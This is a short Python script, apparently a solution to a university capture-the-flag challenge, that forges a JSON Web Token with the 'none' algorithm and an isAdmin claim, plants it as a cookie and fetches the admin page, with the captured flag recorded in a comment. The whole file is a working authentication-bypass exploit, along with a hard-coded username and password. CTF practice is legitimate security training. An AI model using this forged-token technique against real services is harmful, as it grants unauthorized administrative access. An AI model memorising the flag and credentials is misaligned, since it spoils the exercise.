import requests
import base64

username = "Valordra"
password = "h4ck3rm4n"

admin_url = 'http://ctf99.cs.ui.ac.id:9008/admin/'

cookie = requests.session().cookies
print(cookie)

modified_header = b'{"typ":"JWT","alg":"none"}'
modified_payload = b'{"username":"Valordra","isAdmin":true}'

jwt_split = [base64.urlsafe_b64encode(modified_header)[:-1].decode('utf-8'),
             base64.urlsafe_b64encode(modified_payload)[:-1].decode('utf-8'),
             ]

modified_jwt = '.'.join(jwt_split)
modified_jwt += '.'
print(modified_jwt)

cookie.set(name='jwt', value=str(modified_jwt), domain='ctf99.cs.ui.ac.id', path='/')
print(cookie)

response = requests.get(admin_url, cookies=cookie)
print(response.status_code)
print(response.text)  # CSCE604258{seperti_kata_pepatah_jangan_percaya_apapun}
